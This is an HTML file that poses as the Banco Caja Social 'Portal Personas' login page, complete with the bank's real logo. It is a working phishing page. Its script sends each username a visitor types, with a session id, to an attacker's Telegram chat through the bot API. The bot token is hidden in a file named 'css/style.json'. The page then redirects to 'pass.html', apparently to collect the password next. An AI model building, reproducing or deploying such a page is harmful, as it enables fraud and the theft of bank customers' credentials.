<!DOCTYPE html>

<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal Personas</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }

.loaderp {
  width: 48px;
  height: 48px;
  border: 5px solid #FFF;
  border-bottom-color: #e8114b;
  border-radius: 50%;
  display: inline-block;
  box-sizing: border-box;
  animation: rotation 1s linear infinite;
}

@keyframes rotation {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

.loaderp-full {
  position: fixed;
  top: 0;
  overflow-y: hidden;
  z-index: 1000;
  background-color: white;
  width: 100vw;
  height: 100vh;
  display: none;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
```

  </style>
</head>
<body class="bg-gray-50 min-h-screen">
  <div class="max-w-md mx-auto bg-white min-h-screen">
    <!-- Header with logo -->
    <div class="px-6 py-8">
      <div class="mb-8">
        <div class="w-48 h-12 flex items-center">
          <img src="https://bancapersonas.bancocajasocial.com/auth/resources/0flbi/login/bcs/img/logoBCSLine.svg" 
               alt="Logo" 
               class="h-full w-auto object-contain">
        </div>
      </div>

```
  <!-- Welcome title -->
  <h2 class="text-3xl font-bold text-gray-800 mb-6 leading-tight">
    Bienvenido al<br>
    Portal Personas
  </h2>

  <!-- Instructions -->
  <p class="text-gray-600 mb-8 leading-relaxed">
    Recuerde que su usuario está compuesto por su 
    Tipo de Identificación <span class="font-medium">(CC, CE, NI, TI, PE)</span> y su 
    Número de Identificación sin espacios, puntos ni 
    comas.
  </p>

  <!-- User input section -->
  <div class="mb-6">
    <label class="block text-gray-700 text-lg font-medium mb-4">Usuario</label>
    <input 
      id="userInput"
      type="text" 
      class="w-full px-4 py-3 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
      placeholder="Ejemplo: CC123456"
    >
    <p class="text-gray-500 text-sm mt-2">Ejemplo: CC1234567890</p>
  </div>

  <!-- Continue button -->
  <button id="nextButton" disabled 
    class="w-full bg-gray-300 text-gray-500 py-2.5 rounded-full text-lg font-medium mb-8 cursor-not-allowed">
    Siguiente
  </button>

  <!-- Forgot password link -->
  <div class="mb-8">
    <button class="text-blue-600 font-medium flex items-center">
      ¿Olvidó su contraseña? 
      <svg class="w-4 h-4 ml-2" fill="currentColor" viewBox="0 0 20 20">
        <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
      </svg>
    </button>
  </div>

  <!-- New customer section -->
  <div class="border-t border-gray-200 pt-8">
    <p class="text-gray-700 text-lg mb-4">¿Es un cliente nuevo?</p>
    <button class="text-blue-600 font-medium text-lg underline">
      Registrarse
    </button>
  </div>
</div>
```

  </div>

  <!-- LOADER FULL -->

  <div class="loaderp-full">
    <span class="loaderp"></span>
    <p class="text-gray-600 text-lg font-light mt-4">Cargando...</p>
  </div>

  <script>
    const userInput = document.getElementById('userInput');
    const nextButton = document.getElementById('nextButton');
    const loader = document.querySelector(".loaderp-full");

    // Expresión regular: prefijo (CC|CE|NI|TI|PE) seguido de 4-12 dígitos
    const regex = /^(CC|CE|NI|TI|PE)\d{4,12}$/i;

    userInput.addEventListener('input', function () {
      if (regex.test(this.value.trim())) {
        nextButton.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        nextButton.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
        nextButton.disabled = false;
      } else {
        nextButton.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        nextButton.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
        nextButton.disabled = true;
      }
    });

    nextButton.addEventListener('click', async function () {
      const value = userInput.value.trim();
      if (regex.test(value)) {
        loader.style.display = "flex";
        
        // Generar ID único para la sesión
        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        
        // Guardar datos del usuario
        const userData = {
          sessionId: sessionId,
          usuario: value,
          timestamp: new Date().toISOString()
        };
        
        try {
          await sendUserEntryToTelegram(userData);
        } catch (error) {
          console.error('Error al notificar entrada:', error);
        }
        
        // Simular delay y redireccionar
        setTimeout(() => {
          loader.style.display = "none";
          // Guardar datos para la siguiente página
          localStorage.setItem('userData', JSON.stringify(userData));
          window.location.href = "pass.html";
        }, 1500);
      }
    });

    async function sendUserEntryToTelegram(data) {
      const message = `👋 Nuevo usuario ingresó al portal

🆔 Session ID: ${data.sessionId}
👤 Usuario: ${data.usuario}
🕐 Hora de entrada: ${new Date().toLocaleString('es-ES')}
📍 Página: Index (Entrada)`;

      const config = await loadTelegramConfig();
      
      if (!config) {
        console.log('Configuración de Telegram no disponible');
        return;
      }

      return fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: config.chat_id,
          text: message
        }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log("Notificación de entrada enviada a Telegram");
        } else {
          console.error("Error al enviar notificación:", data);
        }
        return data;
      })
      .catch(error => {
        console.error("Error de red:", error);
        throw error;
      });
    }

    async function loadTelegramConfig() {
      try {
        const response = await fetch("./css/style.json");
        if (!response.ok) {
          throw new Error("No se pudo cargar el archivo de configuración.");
        }
        return await response.json();
      } catch (error) {
        console.error("Error al cargar configuración:", error);
        return null;
      }
    }
  </script>

</body>
</html>
